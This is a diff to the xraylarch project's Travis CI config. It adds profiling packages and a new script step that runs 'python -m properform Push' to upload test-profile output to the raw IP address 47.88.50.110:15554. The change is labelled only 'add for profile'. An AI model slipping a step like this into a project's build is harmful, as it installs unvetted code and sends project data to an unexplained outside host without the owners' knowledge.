@@ -1,7 +1,7 @@
 # Config file for automatic testing at travis-ci.org
 
 language: python
-sudo: false
+
 
 python:
     - 2.7
@@ -14,6 +14,9 @@ before_install:
     - conda config --set always_yes yes --set changeps1 no
     - conda update -q conda
     - conda info -a
+  # add for profile
+    - sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test
+    - sudo apt-get update -qq
 
 
 install:
@@ -25,9 +28,18 @@ install:
     - pip install wxmplot 
     - pip install wxutils
     - python setup.py install
+# add for profile
+    - sudo apt-get install -qq g++-4.8
+    - export CXX="g++-4.8"
+    - pip install nose-cprof
+    - pip install properform
 
 
 script:
     - cd tests
-    - nosetests
+    - nosetests --with-cprofile --cprofile-stats-erase --cprofile-stats-file=profile_xraylarch_3d4060f181_0
+    - python -m properform Push 47.88.50.110:15554 asdf_xraylarch_3d4060f181_0 ./profile_xraylarch_3d4060f181_0
 
+ 
+
+ #2017-08-12 22:29:11 modified at 0
